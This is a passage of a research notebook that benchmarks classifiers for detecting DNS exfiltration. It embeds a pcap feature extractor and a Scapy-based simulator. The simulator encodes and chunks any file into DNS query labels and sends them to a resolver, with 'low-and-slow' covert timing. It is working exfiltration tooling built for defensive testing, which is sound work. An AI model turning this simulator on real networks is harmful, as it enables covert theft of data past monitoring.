# 02. Baseline: the paper's model

The base paper's first layer: **14 stateless features per query** (Table 1, F17-F30) and the five classifiers it compares (GNB, RF, MLP, SVM, LR), trained on the **real** captures only. `baseline+window` adds the paper's window rule: a window of 100 queries is flagged when more than 40% of its queries are flagged.

**Expected:** ~100% on the real test set (the real attack is easy), much lower on evasive and diluted traffic. This is the number every later step is compared against.

### Data used by every notebook (identical across 02-07 for a given seed)
| Test set | What it is | Metric |
|---|---|---|
| **real test** | last 30% (by time) of every CIC-Bell-DNS-EXF-2021 capture; training uses the first 70% | F1, FPR |
| **evasive** | 12 synthetic exfiltration families (base32 / hex / base64 / word encoding, labels 12-63 chars, with and without sequence tags, A / AAAA / TXT / NULL, fast / medium / slow) | recall per encoding |
| **hard benign** | synthetic legitimate names that look like exfiltration (CDN / cloud hashes, GUIDs, telemetry, DKIM, DNSBL, 0x20 case, punycode) | FPR |
| **mixed** | one host's normal traffic with ONE attacker diluted in at 1 / 5 / 20 / 50% of its queries, plus a clean stream | recall per rate, FPR |

Synthetic captures use **snaplen 96 like the real ones** and go through the same extractor. All numbers are per query, in %.

### How to run on Colab
1. Zip your PCAP archives into **one** file whose name says the scenario, e.g. `PCAP_Light.zip` (containing `Attacks.zip` and `Benign.zip`). Add `PCAP_Heavy.zip` the same way if you have it.
2. **File -> Upload notebook**, then **Runtime -> Run all**, and pick the zip(s) when the file picker appears.
3. Results download as a zip at the end.

Tip: set `CONFIG["work_dir"]` to a Google Drive folder (and `data_source="drive"`) to reuse the prepared data across notebooks instead of rebuilding it each time.

### Caveats
- Synthetic traffic is an **approximation** of real naming schemes, not captured traffic; use its numbers to compare models, not as deployment estimates.
- The captures cut names at 96 bytes, so the domain of long queries is invisible; those queries share one `<trunc>` bucket per host in the per-domain features.

In [ ]:
import os, sys, json, time, shutil, warnings
from pathlib import Path
import numpy as np
import pandas as pd
warnings.filterwarnings("ignore")
try:
    import google.colab  # noqa: F401
    IN_COLAB = True
except ImportError:
    IN_COLAB = False
pd.set_option("display.max_columns", 40); pd.set_option("display.width", 220); pd.set_option("display.max_rows", 200)

NOTEBOOK = "02_baseline"
CONFIG = {
    "data_source": "upload" if IN_COLAB else "local",      # upload | drive | local  (real PCAP zips)
    "drive_path": "/content/drive/MyDrive/datasets/CIC-Bell-DNS-EXF-2021-PCAP",
    "local_paths": [p for p in os.environ.get("DNS_PCAP", "../data/raw/pcap").split(os.pathsep) if p],
    "work_dir": "/content/work" if IN_COLAB else os.environ.get("DNS_WORK", "../data/processed/work"),
    "output_dir": f"/content/results/{NOTEBOOK}" if IN_COLAB else os.environ.get("DNS_OUT", f"../results/{NOTEBOOK}"),
    "steps": ['baseline'],
    "baseline_models": ['RF', 'GNB', 'MLP', 'SVM', 'LR'],
    "experiment": {},          # overrides for experiment.DEFAULTS, e.g. {"n_mixed": 3000} for a faster run
}
print(f"{NOTEBOOK} | Colab: {IN_COLAB} | steps: {CONFIG['steps']}")

## 1. Modules (embedded copies of `src/`)

In [ ]:
%%writefile pcap_features.py
"""
PCAP -> DNS feature extractor (CIC-Bell-DNS-EXF-2021 re-extraction)
====================================================================
Rebuilds a per-query dataset straight from the raw captures, because the released
CSVs lose the exfiltration traffic (the PCAPs were captured with snaplen=96, so every
DNS name is cut off after ~36 characters and the CSV extractor never sees the chunks).

What it does
------------
* Pure standard library parsing (classic pcap LE/BE, usec/nsec, and pcapng), Ethernet /
  VLAN / Linux-cooked / raw-IP link types, IPv4 + IPv6, UDP port 53 queries.
* Recovers the TRUE DNS message length from the UDP length field even when the packet
  was truncated by the capture (`dns_len`, `truncated`, `name_complete`).
* Stateless features of the paper's Table 1 (F17-F30) computed on the visible name,
  plus content-only ratios that do not depend on name length.
* Per-query label by query SHAPE (DNSExfiltrator "<seq>.<base64url>" chunks, "init"
  handshake, attacker domain) instead of by capture time, and the paper-style file label
  next to it so both can be compared.
* Window features (default 100 queries per source, non-overlapping) for the stateful
  layer. These are computed from the capture itself (no DNSDB / ASN / geo lookups).

Usage
-----
    python src/pcap_features.py PATH [PATH ...] --out-dir data/processed/pcap
    PATH = .pcap / .pcapng / .zip (nested zips ok) / directory

Outputs (in --out-dir): queries.csv, windows.csv, label_audit.csv
"""

import argparse
import csv
import io
import math
import re
import struct
import sys
import zipfile
from collections import Counter, defaultdict
from pathlib import Path

# --------------------------------------------------------------------------- pcap reading
_CLASSIC = {
    b"\xd4\xc3\xb2\xa1": ("<", 1e6),
    b"\xa1\xb2\xc3\xd4": (">", 1e6),
    b"\x4d\x3c\xb2\xa1": ("<", 1e9),
    b"\xa1\xb2\x3c\x4d": (">", 1e9),
}


def iter_packets(fh):
    """Yield (timestamp, linktype, data, orig_len) from a classic pcap or pcapng stream."""
    head = fh.read(4)
    if head == b"\x0a\x0d\x0d\x0a":
        yield from _iter_pcapng(fh, head)
        return
    if head not in _CLASSIC:
        raise ValueError(f"not a pcap/pcapng file (magic {head.hex()})")
    end, div = _CLASSIC[head]
    rest = fh.read(20)
    link = struct.unpack(end + "I", rest[16:20])[0]
    ph = struct.Struct(end + "IIII")
    read = fh.read
    while True:
        h = read(16)
        if len(h) < 16:
            return
        sec, frac, incl, orig = ph.unpack(h)
        data = read(incl)
        if len(data) < incl:
            return
        yield sec + frac / div, link, data, orig


def _iter_pcapng(fh, btype):
    end, ifaces = "<", []
    while True:
        if btype is None:
            btype = fh.read(4)
            if len(btype) < 4:
                return
        lenb = fh.read(4)
        if len(lenb) < 4:
            return
        if btype == b"\x0a\x0d\x0d\x0a":                       # section header
            bom = fh.read(4)
            end = "<" if bom == b"\x4d\x3c\x2b\x1a" else ">"
            fh.read(struct.unpack(end + "I", lenb)[0] - 12)
            ifaces, btype = [], None
            continue
        total = struct.unpack(end + "I", lenb)[0]
        body = fh.read(total - 12)
        fh.read(4)
        kind = struct.unpack(end + "I", btype)[0]
        btype = None
        if kind == 1 and len(body) >= 8:                        # interface description
            link, div, i = struct.unpack(end + "H", body[:2])[0], 1e6, 8
            while i + 4 <= len(body):
                code, olen = struct.unpack(end + "HH", body[i:i + 4])
                if code == 0:
                    break
                if code == 9 and olen >= 1:
                    b = body[i + 4]
                    div = float(2 ** (b & 0x7F)) if b & 0x80 else float(10 ** b)
                i += 4 + ((olen + 3) & ~3)
            ifaces.append((link, div))
        elif kind == 6 and len(body) >= 20:                     # enhanced packet
            ifc, hi, lo, cap, orig = struct.unpack(end + "IIIII", body[:20])
            link, div = ifaces[ifc] if ifc < len(ifaces) else (1, 1e6)
            yield ((hi << 32) | lo) / div, link, body[20:20 + cap], orig
        elif kind == 3 and len(body) >= 4:                      # simple packet
            orig = struct.unpack(end + "I", body[:4])[0]
            link = ifaces[0][0] if ifaces else 1
            yield 0.0, link, body[4:4 + min(orig, len(body) - 4)], orig


# --------------------------------------------------------------------------- L3 / L4 / DNS
def udp_info(link, d):
    """-> (src_ip, sport, dport, udp_len, captured_payload) for IPv4/IPv6 UDP, else None."""
    n = len(d)
    if link == 1:
        if n < 14:
            return None
        et, off = (d[12] << 8) | d[13], 14
        while et in (0x8100, 0x88A8, 0x9100):
            if n < off + 4:
                return None
            et, off = (d[off + 2] << 8) | d[off + 3], off + 4
    elif link == 113:
        if n < 16:
            return None
        et, off = (d[14] << 8) | d[15], 16
    elif link in (101, 12, 14):
        if n < 1:
            return None
        et, off = (0x0800 if d[0] >> 4 == 4 else 0x86DD), 0
    else:
        return None
    if et == 0x0800:
        if n < off + 20 or d[off + 9] != 17:
            return None
        if (((d[off + 6] & 0x1F) << 8) | d[off + 7]) != 0:      # non-first fragment
            return None
        src, l4 = ".".join(map(str, d[off + 12:off + 16])), off + (d[off] & 15) * 4
    elif et == 0x86DD:
        if n < off + 40:
            return None
        nh, l4, src = d[off + 6], off + 40, d[off + 8:off + 24].hex()
        while nh in (0, 43, 60):
            if n < l4 + 8:
                return None
            nh, l4 = d[l4], l4 + (d[l4 + 1] + 1) * 8
        if nh != 17:
            return None
    else:
        return None
    if n < l4 + 8:
        return None
    sport, dport, ulen = struct.unpack_from("!HHH", d, l4)
    return src, sport, dport, ulen, d[l4 + 8:l4 + ulen]


def parse_query(p):
    """Truncation-tolerant parse of the first question. -> (flags, labels, name_complete, qtype)"""
    if len(p) < 12:
        return None
    flags = (p[2] << 8) | p[3]
    if flags & 0x8000 or ((p[4] << 8) | p[5]) < 1:             # response, or no question
        return None
    i, n, labels, complete = 12, len(p), [], False
    while i < n:
        c = p[i]
        if c == 0:
            complete, i = True, i + 1
            break
        if c & 0xC0:
            break
        seg = p[i + 1:i + 1 + c]
        labels.append(seg.decode("latin-1"))
        if len(seg) < c:
            break
        i += 1 + c
    qtype = ((p[i] << 8) | p[i + 1]) if complete and i + 4 <= n else None
    return flags, labels, complete, qtype


# --------------------------------------------------------------------------- features
QTYPE = {1: "A", 2: "NS", 5: "CNAME", 6: "SOA", 10: "NULL", 12: "PTR", 15: "MX", 16: "TXT",
         28: "AAAA", 33: "SRV", 65: "HTTPS", 255: "ANY"}
SLD2 = {"co", "com", "org", "net", "gov", "edu", "ac", "or", "ne", "go"}
B64URL = re.compile(r"[A-Za-z0-9_-]+")
VOWELS = set("aeiouAEIOU")
ATTACK_TYPES = ["audio", "compressed", "exe", "image", "text", "video"]
ATTACKER_DOMAIN = "cicresearch"


def shannon(s):
    if not s:
        return 0.0
    c, n = Counter(s), len(s)
    return -sum(v / n * math.log2(v / n) for v in c.values())


def longest_alpha_run(s):
    best = cur = 0
    for ch in s:
        cur = cur + 1 if ch.isalpha() else 0
        best = max(best, cur)
    return best


def split_name(labels, complete):
    """-> (sld, subdomain_str, has_subdomain). Truncated names have no visible domain."""
    if not complete:
        return "<trunc>", ".".join(labels), 1
    suffix = 2 if len(labels) >= 3 and len(labels[-1]) == 2 and labels[-2] in SLD2 else 1
    idx = len(labels) - suffix - 1
    if idx < 0:
        return (labels[0] if labels else ""), "", 0
    return labels[idx], ".".join(labels[:idx]), int(idx > 0)


def exfil_shape(labels, name):
    """Label by query shape (DNSExfiltrator chunk / init handshake / attacker domain)."""
    if ATTACKER_DOMAIN in name.lower():
        return True
    if len(labels) >= 2:
        if labels[0].isdigit() and len(labels[1]) >= 20 and B64URL.fullmatch(labels[1]):
            return True
        if labels[0] == "init":
            return True
    return False


def query_features(labels, complete, qtype, dns_len, truncated):
    name = ".".join(labels)
    sld, sub, has_sub = split_name(labels, complete)
    chars = name.replace(".", "")
    nchar = max(len(chars), 1)
    lens = [len(x) for x in labels] or [0]
    upper = sum(c.isupper() for c in chars)
    lower = sum(c.islower() for c in chars)
    digit = sum(c.isdigit() for c in chars)
    special = len(chars) - upper - lower - digit
    # name length on the wire = len(".".join(labels)) + 2 ; DNS msg = 12 hdr + name + 4 (qtype/qclass)
    est = max(len(name), dns_len - 16) if truncated else len(name)
    return {
        "FQDN_count": len(name), "subdomain_length": len(sub), "upper": upper, "lower": lower,
        "numeric": digit, "entropy": round(shannon(name), 6), "special": special,
        "labels": len(labels), "labels_max": max(lens), "labels_average": round(sum(lens) / len(lens), 4),
        "longest_word": longest_alpha_run(chars), "sld": sld,
        "len": len(sld) + len(sub) + (1 if sub else 0), "subdomain": has_sub,
        # capture-aware extras
        "dns_len": dns_len, "fqdn_len_est": est, "truncated": int(truncated), "name_complete": int(complete),
        "qtype": QTYPE.get(qtype, "OTHER" if qtype is not None else "UNK"),
        # content-only (independent of name length)
        "upper_ratio": round(upper / nchar, 4), "lower_ratio": round(lower / nchar, 4),
        "digit_ratio": round(digit / nchar, 4), "special_ratio": round(special / nchar, 4),
        "vowel_ratio": round(sum(c in VOWELS for c in chars) / nchar, 4),
        "unique_char_ratio": round(len(set(chars)) / nchar, 4),
        "first_label_numeric": int(bool(labels) and labels[0].isdigit()),
    }


QUERY_FIELDS = [
    "file", "scenario", "file_kind", "attack_type", "pkt_index", "ts", "src",
    "label", "label_paper", "name",
    "FQDN_count", "subdomain_length", "upper", "lower", "numeric", "entropy", "special", "labels",
    "labels_max", "labels_average", "longest_word", "sld", "len", "subdomain",
    "dns_len", "fqdn_len_est", "truncated", "name_complete", "qtype",
    "upper_ratio", "lower_ratio", "digit_ratio", "special_ratio", "vowel_ratio",
    "unique_char_ratio", "first_label_numeric",
]


# --------------------------------------------------------------------------- windows
def window_rows(meta, recs, size):
    """recs: list of (ts, dns_len, entropy, qtype, name, sld, truncated, is_exfil, upper_ratio)"""
    out = []
    for w, start in enumerate(range(0, len(recs), size)):
        ch = recs[start:start + size]
        if len(ch) < max(size // 2, 2):
            continue                                            # drop a tiny tail window
        n = len(ch)
        ts = [r[0] for r in ch]
        lens = [r[1] for r in ch]
        mean_len = sum(lens) / n
        gaps = [b - a for a, b in zip(ts, ts[1:])]
        dur = max(ts[-1] - ts[0], 1e-6)
        qt = Counter(r[3] for r in ch)
        exf = sum(r[7] for r in ch) / n
        row = dict(meta)
        row.update({
            "window": w, "n": n, "t_start": ts[0], "duration": round(dur, 6),
            "qps": round(n / dur, 6), "gap_mean": round(sum(gaps) / len(gaps), 6) if gaps else 0.0,
            "len_mean": round(mean_len, 4),
            "len_std": round(math.sqrt(sum((x - mean_len) ** 2 for x in lens) / n), 4),
            "len_max": max(lens), "entropy_mean": round(sum(r[2] for r in ch) / n, 6),
            "upper_ratio_mean": round(sum(r[8] for r in ch) / n, 6),
            "unique_name_ratio": round(len({r[4] for r in ch}) / n, 4),
            "unique_sld": len({r[5] for r in ch}),
            "truncated_frac": round(sum(r[6] for r in ch) / n, 4),
            "long_frac": round(sum(x > 100 for x in lens) / n, 4),
        })
        for q in ("A", "AAAA", "TXT", "NULL", "CNAME", "MX", "PTR"):
            row[f"frac_{q}"] = round(qt.get(q, 0) / n, 4)
        row["frac_other"] = round(1 - sum(row[f"frac_{q}"] for q in ("A", "AAAA", "TXT", "NULL", "CNAME", "MX", "PTR")), 4)
        row["exfil_frac"] = round(exf, 4)
        row["label"] = int(exf >= 0.5)
        out.append(row)
    return out


WINDOW_FIELDS = [
    "file", "scenario", "file_kind", "attack_type", "src", "window", "n", "t_start", "duration", "qps",
    "gap_mean", "len_mean", "len_std", "len_max", "entropy_mean", "upper_ratio_mean",
    "unique_name_ratio", "unique_sld", "truncated_frac", "long_frac",
    "frac_A", "frac_AAAA", "frac_TXT", "frac_NULL", "frac_CNAME", "frac_MX", "frac_PTR", "frac_other",
    "exfil_frac", "label",
]


# --------------------------------------------------------------------------- inputs
def _walk(path, shown=None):
    """Yield (display_path, opener) for every capture below path (dirs, zips, nested zips)."""
    path = Path(path) if not isinstance(path, Path) else path
    shown = shown or str(path)
    if path.is_dir():
        for p in sorted(path.rglob("*")):
            if p.is_file() and p.suffix.lower() in (".pcap", ".pcapng", ".cap", ".zip"):
                yield from _walk(p)
    elif path.suffix.lower() == ".zip":
        with zipfile.ZipFile(path) as zf:
            yield from _walk_zip(zf, shown)
    else:
        yield shown, (lambda p=path: open(p, "rb"))


def _walk_zip(zf, shown):
    for info in zf.infolist():
        if info.is_dir():
            continue
        low = info.filename.lower()
        disp = f"{shown}/{info.filename}"
        if low.endswith((".pcap", ".pcapng", ".cap")):
            yield disp, (lambda z=zf, i=info: z.open(i))
        elif low.endswith(".zip"):
            with zipfile.ZipFile(io.BytesIO(zf.read(info))) as inner:
                yield from _walk_zip(inner, disp)


def classify_file(display):
    """-> (scenario, file_kind, attack_type). Kind comes only from the last two path parts
    (folders like 'Attack_Light_Benign' contain both words)."""
    parts = display.replace("\\", "/").split("/")
    tail = "/".join(parts[-2:]).lower()
    base = parts[-1].lower()
    kind = "benign" if "benign" in tail else "attack"
    full = display.lower()
    scenario = "light" if "light" in full else "heavy" if "heavy" in full else "unknown"
    atype = "benign" if kind == "benign" else next((t for t in ATTACK_TYPES if t in base), "unknown")
    return scenario, kind, atype


# --------------------------------------------------------------------------- main routine
def extract_file(display, opener, qwriter, ports=(53,), window=100, scenario_override=None, max_packets=None):
    scenario, kind, atype = classify_file(display)
    if scenario_override:
        scenario = scenario_override
    meta = {"file": display.replace("\\", "/").split("/")[-1], "scenario": scenario,
            "file_kind": kind, "attack_type": atype}
    per_src, stats = defaultdict(list), Counter()
    with opener() as fh:
        for idx, (ts, link, data, _orig) in enumerate(iter_packets(fh)):
            if max_packets and idx >= max_packets:
                break
            stats["packets"] += 1
            u = udp_info(link, data)
            if not u or u[2] not in ports:
                continue
            src, _sp, _dp, ulen, payload = u
            q = parse_query(payload)
            if not q:
                continue
            _flags, labels, complete, qtype = q
            dns_len = max(ulen - 8, len(payload))
            truncated = len(payload) < ulen - 8
            name = ".".join(labels)
            f = query_features(labels, complete, qtype, dns_len, truncated)
            exfil = int(kind == "attack" and exfil_shape(labels, name))
            row = dict(meta)
            row.update(f)
            row.update({"pkt_index": idx, "ts": round(ts, 6), "src": src, "name": name,
                        "label": exfil, "label_paper": int(kind == "attack")})
            qwriter.writerow(row)
            per_src[src].append((ts, dns_len, f["entropy"], f["qtype"], name, f["sld"],
                                 f["truncated"], exfil, f["upper_ratio"]))
            stats["queries"] += 1
            stats["exfil_shape"] += exfil
            stats["long_msg"] += dns_len > 100
            stats["long_msg_not_labelled"] += (dns_len > 100) and not exfil
            stats["shape_but_short"] += bool(exfil) and dns_len <= 100
            stats["rule_hits_in_benign_file"] += int(kind == "benign" and exfil_shape(labels, name))
            stats["truncated"] += int(truncated)
    wins = []
    for src, recs in per_src.items():
        recs.sort(key=lambda r: r[0])
        m = dict(meta, src=src)
        wins.extend(window_rows(m, recs, window))
    stats = {**dict(stats), **meta}                             # Counter.update() would add, not set
    return stats, wins


def run(inputs, out_dir="data/processed/pcap", window=100, scenario=None, ports=(53,), max_packets=None, verbose=True):
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    audit, n_files = [], 0
    with open(out / "queries.csv", "w", newline="", encoding="utf-8") as qf, \
         open(out / "windows.csv", "w", newline="", encoding="utf-8") as wf:
        qw = csv.DictWriter(qf, fieldnames=QUERY_FIELDS)
        ww = csv.DictWriter(wf, fieldnames=WINDOW_FIELDS)
        qw.writeheader()
        ww.writeheader()
        for inp in inputs:
            for display, opener in _walk(inp):
                n_files += 1
                stats, wins = extract_file(display, opener, qw, ports, window, scenario, max_packets)
                ww.writerows(wins)
                audit.append(stats)
                if verbose:
                    print(f"  {stats['file']:28s} {stats['scenario']:7s} {stats['file_kind']:7s} "
                          f"pkts {stats['packets']:>9,} queries {stats['queries']:>8,} "
                          f"exfil-shape {stats['exfil_shape']:>7,} windows {len(wins):>5,}")
    cols = ["file", "scenario", "file_kind", "attack_type", "packets", "queries", "exfil_shape", "long_msg",
            "long_msg_not_labelled", "shape_but_short", "rule_hits_in_benign_file", "truncated"]
    with open(out / "label_audit.csv", "w", newline="", encoding="utf-8") as af:
        aw = csv.DictWriter(af, fieldnames=cols, extrasaction="ignore")
        aw.writeheader()
        for s in audit:
            aw.writerow({c: s.get(c, 0) for c in cols})
    if verbose:
        print(f"[OK] {n_files} capture(s) -> {out}/queries.csv, windows.csv, label_audit.csv")
    return out


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("inputs", nargs="+", help=".pcap/.pcapng/.zip files or directories")
    ap.add_argument("--out-dir", default="data/processed/pcap")
    ap.add_argument("--window", type=int, default=100, help="queries per window (paper: 100)")
    ap.add_argument("--scenario", choices=["light", "heavy"], help="force scenario if not in the path")
    ap.add_argument("--ports", type=int, nargs="+", default=[53])
    ap.add_argument("--max-packets", type=int, help="debug: stop after N packets per file")
    a = ap.parse_args()
    run(a.inputs, a.out_dir, a.window, a.scenario, tuple(a.ports), a.max_packets)


if __name__ == "__main__":
    sys.exit(main())

In [ ]:
%%writefile dns_simulator.py
"""
Week 2: Scapy DNS Exfiltration Simulation Engine
================================================
Engine to simulate DNS data exfiltration and tunneling attacks using Scapy.
Supports:
- RFC 1035 compliant DNS query label construction.
- Chunking arbitrary files and byte payloads.
- Multiple encodings: Base32 (padding-stripped), Hex, and Base64url.
- Multiple DNS record types: A (1), TXT (16), AAAA (28), CNAME (5).
- Transmission profiles: 'burst' (rapid) and 'low-and-slow' (covert).
- Scapy packet crafting and PCAP generation.
"""

import time
import base64
import random
import re
import argparse
from typing import List, Dict, Any, Optional
from pathlib import Path

try:
    from scapy.all import IP, UDP, DNS, DNSQR, send, wrpcap
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


def validate_rfc_compliance(fqdn: str) -> bool:
    """
    Validate whether an FQDN strictly satisfies RFC 1035 and RFC 2181 rules:
    1. Total length <= 253 characters (excluding terminal dot).
    2. Each label length between 1 and 63 characters.
    3. Label contains only letters [a-z, A-Z], digits [0-9], and hyphens [-].
    4. Label does not start or end with a hyphen.
    """
    cleaned = fqdn.rstrip(".")
    if not cleaned or len(cleaned) > 253:
        return False

    labels = cleaned.split(".")
    label_pattern = re.compile(r"^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?$")

    for label in labels:
        if len(label) < 1 or len(label) > 63:
            return False
        # Single-character labels cannot be a hyphen; longer labels must match pattern
        if not label_pattern.match(label):
            return False

    return True


class DNSExfiltrationSimulator:
    """Simulates DNS data exfiltration by chunking and encoding payloads into RFC-compliant query labels."""

    def __init__(
        self,
        target_domain: str = "tunnel.example.com",
        dns_server: str = "127.0.0.1",
        dns_port: int = 53,
        encoding: str = "base32",
        max_label_length: int = 63,
        delay: float = 0.05,
        jitter: float = 0.01,
    ):
        self.target_domain = target_domain.strip(".")
        self.dns_server = dns_server
        self.dns_port = dns_port
        self.encoding = encoding.lower()
        self.max_label_length = min(max(max_label_length, 10), 63)
        self.delay = delay
        self.jitter = jitter

        if not validate_rfc_compliance(self.target_domain):
            raise ValueError(f"Target domain '{target_domain}' is not RFC 1035 compliant")

    def encode_payload(self, data: bytes) -> str:
        """
        Encode raw payload bytes into DNS-safe string according to selected scheme.
        - base32: RFC 4648 Base32, lowercased, padding '=' stripped.
        - hex: Lowercase hexadecimal string.
        - base64: URL-safe Base64, padding '=' stripped, lowercased.
        """
        if self.encoding == "base32":
            # RFC 4648 Base32 (A-Z, 2-7). Strip '=' padding for RFC-compliant DNS labels.
            return base64.b32encode(data).decode("ascii").rstrip("=").lower()
        elif self.encoding == "hex":
            # Standard hex (0-9, a-f)
            return data.hex().lower()
        elif self.encoding == "base64":
            # URL-safe Base64 (replace '+' with '-', '/' with '_', strip '=')
            return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=").lower().replace("_", "-")
        else:
            raise ValueError(f"Unsupported encoding: {self.encoding}. Choose 'base32', 'hex', or 'base64'.")

    def chunk_payload(self, encoded_data: str) -> List[str]:
        """
        Chunk encoded payload into sequence-tagged labels that fit strictly
        within the 63-char label limit and the 253-char FQDN limit.
        """
        if not encoded_data:
            raise ValueError("Payload cannot be empty")

        # Estimate sequence digits needed
        # Format: sq<seq>.<chunk>.<target_domain>
        # Each query: len(target_domain) + 1 + len(seq_label) + 1 + len(chunk) <= 253
        # Max chunk label len is min(self.max_label_length, available_len)
        base_overhead = len(self.target_domain) + 1  # ".target_domain"
        seq_label_len = 8  # e.g., "sq000001"
        max_chunk_len = min(self.max_label_length, 253 - base_overhead - seq_label_len - 1)

        if max_chunk_len < 4:
            raise ValueError(f"Target domain '{self.target_domain}' leaves too few characters for payload chunking")

        raw_chunks = [encoded_data[i:i + max_chunk_len] for i in range(0, len(encoded_data), max_chunk_len)]
        total = len(raw_chunks)
        pad_width = max(4, len(str(total)))

        labeled_chunks = []
        for idx, chunk in enumerate(raw_chunks, start=1):
            seq_tag = f"sq{idx:0{pad_width}d}"
            # Ensure chunk doesn't start or end with hyphen
            clean_chunk = chunk.strip("-")
            if not clean_chunk:
                clean_chunk = "0"
            labeled_chunks.append(f"{seq_tag}.{clean_chunk}")

        return labeled_chunks

    def generate_queries(self, payload: bytes) -> List[str]:
        """
        Generate complete, RFC-compliant FQDN queries for the payload.
        Verifies RFC compliance for every generated query.
        """
        encoded = self.encode_payload(payload)
        chunks = self.chunk_payload(encoded)
        fqdns = [f"{chunk}.{self.target_domain}" for chunk in chunks]

        for q in fqdns:
            if not validate_rfc_compliance(q):
                raise ValueError(f"Generated query violates RFC 1035 rules: {q}")

        return fqdns

    def craft_packet(self, fqdn: str, qtype: str = "A"):
        """Craft a Scapy DNS query packet."""
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required to craft network packets.")

        qtype_map = {"A": 1, "AAAA": 28, "TXT": 16, "CNAME": 5}
        qtype_num = qtype_map.get(qtype.upper(), 1)

        pkt = (
            IP(dst=self.dns_server)
            / UDP(sport=random.randint(1024, 65535), dport=self.dns_port)
            / DNS(rd=1, qd=DNSQR(qname=fqdn, qtype=qtype_num))
        )
        return pkt

    def send_queries(
        self,
        queries: List[str],
        qtype: str = "A",
        save_pcap: Optional[str] = None,
        verbose: bool = True,
    ) -> List[Dict[str, Any]]:
        """
        Transmit generated queries (or craft packets and write to PCAP).
        Returns a list of query transmission metadata dictionaries.
        """
        records = []
        packets = []

        if verbose:
            print(f"[*] Transmitting {len(queries)} DNS queries via {qtype} records to {self.dns_server}:{self.dns_port}...")

        start_time = time.time()
        for i, fqdn in enumerate(queries, start=1):
            now = time.time()
            record = {
                "timestamp": now,
                "src_ip": "127.0.0.1",
                "dst_ip": self.dns_server,
                "qname": fqdn,
                "qtype": qtype.upper(),
                "chunk_index": i,
                "total_chunks": len(queries),
                "encoding": self.encoding,
                "label": 1  # Malicious / exfiltration
            }
            records.append(record)

            if SCAPY_AVAILABLE:
                pkt = self.craft_packet(fqdn, qtype=qtype)
                packets.append(pkt)
                try:
                    send(pkt, verbose=False)
                except Exception as e:
                    if verbose:
                        print(f"    [!] Error sending packet {i}: {e}")

            if verbose and (i <= 5 or i == len(queries) or i % 50 == 0):
                print(f"    [{i:4d}/{len(queries)}] Sent: {fqdn[:55]}...")

            # Jittered delay
            if self.delay > 0:
                sleep_time = max(0.001, self.delay + random.uniform(-self.jitter, self.jitter))
                time.sleep(sleep_time)

        elapsed = time.time() - start_time
        if verbose:
            print(f"[✓] Simulation completed: {len(queries)} queries transmitted in {elapsed:.2f}s ({len(queries)/max(elapsed, 0.001):.1f} q/s)")

        if save_pcap and SCAPY_AVAILABLE and packets:
            pcap_path = Path(save_pcap)
            pcap_path.parent.mkdir(parents=True, exist_ok=True)
            wrpcap(str(pcap_path), packets)
            if verbose:
                print(f"[✓] Saved {len(packets)} crafted packets to {pcap_path}")

        return records


def main():
    parser = argparse.ArgumentParser(
        description="Week 2: Scapy DNS Exfiltration Simulator (RFC-Compliant Chunking & Encoding)"
    )
    parser.add_argument("--domain", default="tunnel.example.com", help="Attacker controlled apex/tunnel domain")
    parser.add_argument("--server", default="127.0.0.1", help="Target DNS resolver IP")
    parser.add_argument("--port", type=int, default=53, help="DNS port")
    parser.add_argument("--encoding", choices=["base32", "hex", "base64"], default="base32", help="Encoding scheme")
    parser.add_argument("--type", choices=["A", "TXT", "AAAA", "CNAME"], default="TXT", help="DNS query record type")
    parser.add_argument("--text", help="Plain text string to exfiltrate")
    parser.add_argument("--file", help="Path to file to exfiltrate")
    parser.add_argument("--mode", choices=["burst", "low-and-slow"], default="burst", help="Transmission profile")
    parser.add_argument("--delay", type=float, help="Explicit delay between queries in seconds (overrides mode)")
    parser.add_argument("--pcap-out", help="Save generated packets to PCAP file")
    parser.add_argument("--dry-run", action="store_true", help="Print crafted queries without sending network packets")

    args = parser.parse_args()

    # Determine payload
    if args.file:
        file_path = Path(args.file)
        if not file_path.exists():
            print(f"[!] File not found: {args.file}")
            sys.exit(1)
        payload = file_path.read_bytes()
        print(f"[*] Loaded {len(payload)} bytes from file: {file_path.name}")
    elif args.text:
        payload = args.text.encode("utf-8")
        print(f"[*] Loaded {len(payload)} bytes from provided text string.")
    else:
        payload = b"CRITICAL_EXFIL_DATA: user=admin, secret_token=x89Fa9c01B2dE, timestamp=1710000000"
        print(f"[*] Using sample exfiltration payload ({len(payload)} bytes).")

    # Set delay based on profile
    if args.delay is not None:
        delay = args.delay
        jitter = delay * 0.1
    elif args.mode == "low-and-slow":
        delay = 2.0
        jitter = 0.5
    else:  # burst
        delay = 0.01
        jitter = 0.002

    sim = DNSExfiltrationSimulator(
        target_domain=args.domain,
        dns_server=args.server,
        dns_port=args.port,
        encoding=args.encoding,
        delay=delay,
        jitter=jitter,
    )

    queries = sim.generate_queries(payload)
    print(f"[✓] Generated {len(queries)} RFC-compliant DNS queries using '{args.encoding}' encoding.")
    print(f"[*] First query sample: {queries[0]}")
    print(f"[*] RFC 1035 validity check: {'PASSED' if validate_rfc_compliance(queries[0]) else 'FAILED'}")

    if args.dry_run:
        print("\n--- Dry Run: Crafted Queries ---")
        for i, q in enumerate(queries[:10], start=1):
            print(f"  [{i:2d}] {q}")
        if len(queries) > 10:
            print(f"  ... and {len(queries) - 10} more queries.")
    else:
        sim.send_queries(queries, qtype=args.type, save_pcap=args.pcap_out)


if __name__ == "__main__":
    main()

In [ ]:
%%writefile evasion_data.py
"""
Synthetic test traffic: evasive exfiltration + hard benign DNS
================================================================
The real CIC-Bell-DNS-EXF-2021 traffic is one tool (DNSExfiltrator) with one fixed shape and
benign traffic that is plain website lookups, so every classifier scores ~100% on it. This module
builds the two missing test sets as classic PCAPs (+ a labels sidecar), so they go through exactly
the same extractor (`pcap_features.py`) as the real captures:

1. EVASIVE EXFILTRATION  - the project's DNSExfiltrationSimulator (base32 / hex / base64, label
   length 12-63) plus variants it cannot produce: no sequence tag, word-encoding (low entropy),
   TXT / NULL / AAAA query types.
2. HARD BENIGN           - legitimate names that LOOK like exfiltration: CDN and cloud hostnames,
   hashed / GUID labels, telemetry, DKIM / DNSBL / PTR, DNS-0x20 case randomisation, punycode.
